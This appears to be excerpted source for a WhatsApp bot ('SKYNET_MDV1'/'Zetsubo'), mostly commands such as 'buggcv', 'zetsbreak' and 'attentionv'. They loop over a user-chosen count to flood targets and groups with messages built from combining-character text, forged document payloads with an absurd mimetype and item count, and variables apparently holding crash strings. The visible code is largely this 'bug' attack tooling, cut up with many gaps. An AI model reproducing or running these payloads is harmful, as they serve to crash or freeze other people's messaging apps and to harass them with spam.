...
const zets = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid :"status@broadcast" }: {})},
 ...
 "itemCount":999999999,
 "status":"INQUIRY","surface":"CATALOG","message":`༐༑⿻𝐙.𝐱.𝐕𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑`,
...
const reply = (teks) => {
return zetsubo.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `༐༑⿻✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇⿻༔༐༑ - ${botname}`,"body": `Selamat ${salam2} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/565f8fc3e0cffb4a7ffd4.jpg',"thumbnail": thumbnail,"sourceUrl": `https://instagram.com/sixgd7777?igshid=MzNlNGNkZWQ4Mg==`}}}, { quoted:m})} 

const zetsreply = async (teks) => {
	    zetsubo.sendMessage(from, { text:teks, contextInfo: {externalAdReply : {
        title : `特 ༑༑༔✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ 𖦅 🦠`,
        body : `༐༑⿻⸙𝐌𝐰𝐚𝐬⸙𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑`,
...
let { key } = await zetsubo.sendMessage(from, {text: '@𝑴𝑾𝑨𝑺 𝑴𝑶𝑫𝒁.'})//Pengalih isu
...
reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf ZetsuboXygen*')
}
...
case 'addprem':
if (!isCreator) return reply('*khusus Premium*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 254795363396`)
...
case 'delprem':
if (!isCreator) return reply('*khusus Premium*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 254102074064`)
...
case 'pengguna':  {
if (!isCreator) return reply('*khusus Premium*')
if (!args[0]) return reply(`*Contoh : ${command} add 254102074064*`)
if (args[1]) {
...
"caption":` ༐༑⿻✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇𝐗𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
...
break
//=================================================//
case 'xgroup' : case 'zetsbreak' : case 'zetsinternal' : case 'buggcv' : case 'buggcw' : case 'buggcx' : case 'buggcy' : case 'buggcz' : case 'attentionv' : case 'attentionw' : case 'attentionz' : case 'gasfullgc' : {
 if (!isCreator) return reply('*khusus Premium*')
 await loading()
...
attention(`( ˹ ■■■□90% 🌟𝐙̸̱͗͢͡𝚺𝅩̲𝐓͟𝐒̶̱͞𝐔𖫲𖫲ً͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐙̸̱͗͢͡𝚺𝅩̲𝐓͟𝐒̶̱͞𝐔𖫲𖫲ً͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐙̸̱͗͢͡𝚺𝅩̲𝐓͟𝐒̶̱͞𝐔𖫲𖫲ً͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
...
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐃𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒𝐗${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐃⛥𝐑✞𝐄⚸𝐗${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐃⛥𝐑✞𝐄⚸𝐗${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐌☩𝐖⸙𝐀᪣𝐒${zetsubonotgay}${ios1}.${ios2}`)
...
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "༐༑⿻✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇⿻༔༐༑",
"title": "༐༑⿻𝐌☩𝐖⸙𝐀᪣𝐒𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zetsubo - Console V1.${bugui}`,
...
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ༐༑⿻𝐌☩𝐖⸙𝐀᪣𝐒𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
...
for (let i = 0; i < jumlah; i++) {
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐗𝐘𝐆𝐄𝐍𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
...
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐃⛥𝐑✞𝐄⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
...
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "༐༑⿻𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕⿻༔༐༑",
"title": "༐༑⿻𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zetsubo - Console V1.${bugui}`,
...
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ༐༑⿻𝐌☩𝐖⸙𝐀᪣𝐒⚸𝐗𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
zetsubo.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
...
for (let i = 0; i < jumlah; i++) {
konsol(`༑[🌤️⃟⃙𖧌𝐙𝐞𝐭𝐬𝐮𝐛𝟎𝐗𝐲𝐠𝐞𝐧 - 𝐙𝐱𝐕 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐙𝐞𝐭𝐬𝐮𝐛𝟎𝐗𝐲𝐠𝐞𝐧 - 𝐙𝐱𝐕 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
await sleep(1000) 
konsol(`༑[🌤️⃟⃙𖧌𝐙𝐞𝐭𝐬𝐮𝐛𝟎𝐗𝐲𝐠𝐞𝐧 - 𝐙𝐱𝐕 𖧌⃙⃟🌦️]༑${zetsubonotgay}${ios1}.${ios2}${mdelay}`)
...
for (let i = 0; i < jumlah; i++) {
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ 𝐌☩𝐖⸙𝐀᪣𝐒gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ 𝐃⛥𝐑✞𝐄⚸𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ 𝐃⛥𝐑✞𝐄⚸𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ 𝐌☩𝐖⸙𝐀᪣𝐒 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ 𝐌☩𝐖⸙𝐀᪣𝐒 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇⚸𝐗 gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐌☩𝐖⸙𝐀᪣𝐒😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇y ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ 𝐃✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${zetsubonotgay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ gay ♣️_🌈̞⃜ ...~${zetsubonotgay}${ios1}.${ios2}`)
...
for (let i = 0; i < jumlah; i++) {
attention(`[[ ༑ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
...
attention(`[[ ༑ 𝐙𝐱𝐕 ⿻ 𝐕𝐢𝐒𝐢𝟎𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐌☩𝐖⸙𝐀᪣𝐒𝐍 ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ 𝐌☩𝐖⸙𝐀᪣𝐒 ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇ ༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
await sleep(500) 
attention(`[[ ༑ ✇⚚ 𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ⚚✇༑ ]]${zetxdgay.zip}${ios1}.${ios2}${mdelay}`)
...
for (let i = 0; i < jumlah; i++) {
attention(`🌤️𝐙𝐞𝐭𝐬𝐮𝐛𝐨 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐙𝐞𝐭𝐬𝐮𝐛𝐨 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐙𝐞𝐭𝐬𝐮𝐛𝐨 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
...
for (let i = 0; i < jumlah; i++) {
attention(`⛅⃟導入𝅛𝒁͢𝜮𝑻𝑺𝑼𝑩͢𝜪 - 𝑮͢𝜮𝑵𝑮𝜪͢𝑫𝅛私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入𝅛𝒁͢𝜮𝑻𝑺𝑼𝑩͢𝜪 - 𝑮͢𝜮𝑵𝑮𝜪͢𝑫𝅛私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入𝅛𝒁͢𝜮𝑻𝑺𝑼𝑩͢𝜪 - 𝑮͢𝜮𝑵𝑮𝜪͢𝑫𝅛私⃟🌤️${restugay}${ios1}.${ios2}`)
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zetsubo.sendMessage(from, { text: `༐༑⿻𝐙.𝐱͢.𝐕𖥂𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰𝐗𝐲𝐠𝐞𝐧 - 𝟕𝐆͢𝛉𝐃 - 𝟎𝐩 ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐙.𝐱͢.𝐕𖥂𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰𝐗𝐲𝐠𝐞𝐧 - 𝟕𝐆͢𝛉𝐃 - 𝟎𝐩 ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
...
"expired":"0",
"groupType":"0",
"groupName": `༐༑⿻𝐙.𝐱.𝐕⿻༔༐༑${cttl}`,
"caption": `༐༑⿻𝐙.𝐱.𝐕𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑${bugui}`,
...
case 'ping': {
  ...
  const pingMsg = await zetsubo.sendMessage(m.chat, { text: '*initializing*' });
 ...
 await zetsubo.relayMessage(m.chat, {
      protocolMessage: {
        ...
        type: 14,
        editedMessage: {
          conversation: `*𝑺𝑲𝒀𝑵𝑬𝑻_𝑴𝑫𝑽1 ➟* *${new Date() - startTime}* 𝐌/𝐒`
        }
      }
    }, {});
  } 
...
const audiovn = "./Classic.mp3";
    const dooc = {
        ...
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "ITS NICE TO BE ALIVE,ARE YOU?",
          body: "https://chat.whatsapp.com/LNYsNPdpLy130W7bqMtXeW",
          thumbnailUrl: "https://telegra.ph/file/0736ea8488cbdad98fee5.jpg",
          sourceUrl: "https://chat.whatsapp.com/LNYsNPdpLy130W7bqMtXeW",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };
...
konsol(`😈⃟導入𝐗𝐲𝐠𝐞𝐧 𝈺 𝟕𝐆͢𝛉𝐃私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐗𝐲𝐠𝐞𝐧 𝈺 𝟕𝐆͢𝛉𝐃私⃟👿.${ios2}${ios1}`)
await sleep(1000) 
konsol(`😈⃟導入𝐗𝐲𝐠𝐞𝐧 𝈺 𝟕𝐆͢𝛉𝐃私⃟👿.${ios2}${ios1}`)
